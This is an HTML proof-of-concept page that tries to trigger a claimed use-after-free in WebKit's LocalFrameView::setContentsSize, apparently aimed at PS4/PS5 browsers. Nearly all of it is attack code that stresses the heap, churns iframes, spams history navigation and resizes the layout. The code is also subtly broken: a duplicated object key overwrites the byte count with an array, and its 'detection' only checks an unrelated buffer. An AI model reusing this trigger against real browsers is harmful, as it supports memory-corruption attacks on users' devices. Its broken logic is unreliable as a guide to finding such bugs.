<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FrameView UAF PoC (PS4/PS5?)</title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #console {
            margin-top: 10px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>FrameView UAF PoC</h1>
    <p>Click to test UAF in LocalFrameView::setContentsSize.</p>
    <button id="trigger">TEST UAF</button>
    <div id="status">Idle...</div>
    <div id="console"></div>
    <script>
        const status = document.getElementById('status');
        const consoleDiv = document.getElementById('console');
        let attemptCount = 0;

        function log(msg) {
            consoleDiv.append(msg + '\n');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function stressGC() {
            for (let i = 0; i < 1000; i++) {
                new ArrayBuffer(1024 * 1024);
            }
            for (let i = 0; i < 200; i++) {
                new ArrayBuffer(2 * 1024 * 1024);
            }
        }

        function changeContentSize() {
            document.body.style.width = `${Math.random() * 1000 + 500}px`;
            document.body.style.height = `${Math.random() * 1000 + 500}px`;
            document.body.offsetHeight; // Force layout
        }

        function navigateHistory() {
            for (let i = 0; i < 10; i++) {
                history.pushState({ page: i }, `Page ${i}`, `#page${i}`);
            }
            history.back();
        }

        function createIframe() {
            const iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            document.body.appendChild(iframe);
            return iframe;
        }

        function checkMemoryChanges() {
            const buffer = new ArrayBuffer(4096);
            const view = new Uint8Array(buffer);
            for (let i = 0; i < view.length; i++) {
                view[i] = 0x46;
            }
            return () => {
                let changes = 0;
                const changesMap = new Map();
                for (let i = 0; i < view.length; i++) {
                    if (view[i] !== 0x46) {
                        changes++;
                        const key = `0x46->0x${view[i].toString(16).padStart(2, '0')}`;
                        changesMap.set(key, (changesMap.get(key) || 0) + 1);
                    }
                }
                return { changes, changes: [...changesMap] };
            };
        }

        async function detectUAF() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;
            log(`Attempt ${attemptCount} started`);

            try {
                // Create memory checker
                const check = checkMemoryChanges();
                const iframes = [];

                // Create iframes
                for (let i = 0; i < 5; i++) {
                    iframes.push(createIframe());
                }

                // Stress heap and trigger navigation
                const interval = setInterval(() => {
                    changeContentSize();
                    navigateHistory();
                    stressGC();
                    // Remove and recreate iframes
                    iframes.forEach(iframe => iframe.remove());
                    for (let i = 0; i < 5; i++) {
                        iframes.push(createIframe());
                    }
                }, 100);

                // Check for memory changes or crash
                setTimeout(() => {
                    clearInterval(interval);
                    const result = check();
                    if (result.changes > 0) {
                        status.textContent = `UAF detected! ${result.changes} bytes changed`;
                        log(`UAF detected! ${result.changes} bytes changed`);
                        log(`Changes: ${result.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                    } else {
                        stressGC();
                        setTimeout(() => {
                            const secondResult = check();
                            if (secondResult.changes > 0) {
                                status.textContent = `UAF detected after GC! ${secondResult.changes} bytes changed`;
                                log(`UAF detected after GC! ${secondResult.changes} bytes changed`);
                                log(`Changes: ${secondResult.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                            } else {
                                status.textContent = 'No UAF detected';
                                log('No UAF detected');
                            }
                        }, 10);
                    }
                    // Clean up iframes
                    iframes.forEach(iframe => iframe.remove());
                }, 2000);
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        }

        document.getElementById('trigger').addEventListener('click', async () => {
            try {
                await detectUAF();
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
